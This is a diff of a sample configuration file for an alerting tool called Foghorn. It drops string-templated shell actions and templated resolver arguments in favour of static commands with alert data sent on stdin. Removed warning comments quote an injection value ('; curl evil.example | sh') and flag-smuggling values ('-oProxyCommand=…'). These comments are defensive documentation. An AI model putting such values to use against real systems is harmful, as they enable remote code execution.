@@ -8,12 +8,11 @@
 # ${ENV_VAR} references are expanded at load time, so secrets can stay
 # in your shell environment or a secrets manager instead of this file.
 #
-# SECURITY: everything Foghorn displays — labels, annotations, generatorURL,
-# incident links — is supplied by the alert source. Treat those values as
-# untrusted input, especially where this config feeds them into `actions` and
-# `resolvers` (see the warnings on those sections below). Prefer https:// source
-# URLs: over plain http anyone on the network path can read your credentials and
-# rewrite alert content, which turns those sections into their problem too.
+# SECURITY: the alert source supplies every label, annotation, generatorURL,
+# and incident link that Foghorn displays. Treat those values as untrusted input,
+# especially when action templates display them or resolvers pass them to a local
+# process. Prefer https:// source URLs. With plain http, anyone on the network
+# path can read your credentials and rewrite alert content.
 
 sources:
   - name: local-alertmanager
@@ -45,19 +44,19 @@ sources:
   #     # `openid` is sufficient unless the identity provider requires an
   #     # additional scope such as `offline_access` to issue refresh tokens.
   #     scopes: [openid]
-  #     # On supported macOS and Linux builds, the token fields Foghorn uses are
-  #     # saved in the system credential store by default. Set false for
+  #     # On supported macOS, Linux and Windows builds, the token fields Foghorn
+  #     # uses are saved in the system credential store by default. Set false for
   #     # memory-only authentication.
   #     # persist_tokens: false
-  #     # Optional when discovery is unavailable:
+  #     # Optional when discovery is unavailable. Both must be https unless they
+  #     # point at loopback: Foghorn sends client credentials to them.
   #     # device_authorization_url: https://login.example.com/oauth/device/code
   #     # token_url: https://login.example.com/oauth/token
   #     # Optional: send the ID token instead of the access token.
   #     # use_id_token: true
   #   poll_interval: 30s
-  #   # The source timeout includes interactive device login; the default 10s
-  #   # is too short for a user to complete SSO or MFA.
-  #   timeout: 5m
+  #   # No special timeout is needed: the interactive device login runs in the
+  #   # background rather than inside the source's poll deadline.
   # - name: cookie-alertmanager
   #   type: alertmanager
   #   url: https://alertmanager.example.com
@@ -262,16 +261,19 @@ notifications:
   on_resolved: false
   batch_threshold: 5
 
-# Actions run on your machine when you trigger them from an alert.
+# Actions do not currently have a UI or a Wails binding. Only the non-command
+# `url` and `clipboard` action types remain in the configuration model. URL
+# actions are limited to http, https, and mailto URLs.
 #
-# SECURITY: action templates interpolate alert fields ({{.Labels.x}},
-# {{.Annotations.x}}, {{.GeneratorURL}}) that come from the alert source.
-#   - `shell` actions run through `sh -c`, so an interpolated alert value is
-#     direct command injection: a label of `; curl evil.example | sh` runs.
-#     Never interpolate alert values into a shell action unless you fully trust
-#     the source *and* quote them; prefer a fixed script that takes the value on
-#     stdin, or use a `url`/`clipboard` action instead.
-#   - `url` actions are limited to http/https/mailto URLs.
+# Foghorn rejects the old `shell` action type. It combined remote alert fields
+# and shell syntax in one rendered string, so a source-controlled value could
+# become a command. The renderer could not distinguish intended shell syntax
+# from substitutions that needed escaping, and user-supplied quoting was not a
+# security boundary. The action binding also exposed more backend capability
+# than the UI needed. Foghorn does not plan to restore string-templated commands.
+#
+# If local command actions return, they will need a fixed executable, static
+# arguments, alert data on stdin, and a confirmation enforced by the backend.
 actions: [ ]
 
 resolvers:
@@ -279,32 +281,26 @@ resolvers:
 # only affect display/grouping/sorting/filtering in the UI. Raw labels remain
 # untouched for silences, actions, and provider requests.
 #
-# Each resolver targets one field reference and executes a local command.
-# The command should print the resolved value to stdout.
+# Each resolver targets one field reference and executes a local process when
+# Foghorn needs the value and has no matching cached result. The process must
+# print the resolved value to stdout.
 #
-# SECURITY: resolvers run automatically on every poll, with args and env
-# rendered from alert labels/annotations — i.e. from the remote source. There is
-# no shell involved, so there is no command injection, but the values still land
-# in your command's argv: a command that parses flags can be steered by an alert
-# value that starts with `-` (`-oProxyCommand=…`, `--kubeconfig=…`). Point
-# resolvers at a script you control, and have it treat its arguments as data
-# (e.g. read after a literal `--`, or validate before use).
+# `command`, `args`, and `env` are static process configuration. Templates in
+# any of them are rejected. Choose exactly one stdin format:
+#   value  the raw value of the configured field
+#   json   a versioned object with ref, kind, name, value, the full alert,
+#          labels, and annotations
 #
-# Available templates in command/args/env:
-#   {{.Value}}               raw value for the configured field
-#   {{.Ref}}                 full field ref, e.g. label:cluster
-#   {{.Kind}}                field | label | annotation
-#   {{.Name}}                field/label/annotation name
-#   {{.Alert.Source}}        alert source
-#   {{.Labels.cluster}}      alert label access
-#   {{.Annotations.summary}} alert annotation access
+# SECURITY: stdin is data only. Do not configure a shell, interpreter, or helper
+# that evaluates stdin as code. A resolver should parse and validate the input it
+# reads before using that input in a provider request or another local process.
 #
 # Example: map internal cluster IDs to customer-facing names using a local script.
 # - name: cluster-name
 #   field: label:cluster
 #   command: ./scripts/resolve-cluster
-#   args:
-#     - "{{.Value}}"
+#   args: []
+#   stdin: value
 #   timeout: 500ms
 #   cache_ttl: 24h
 
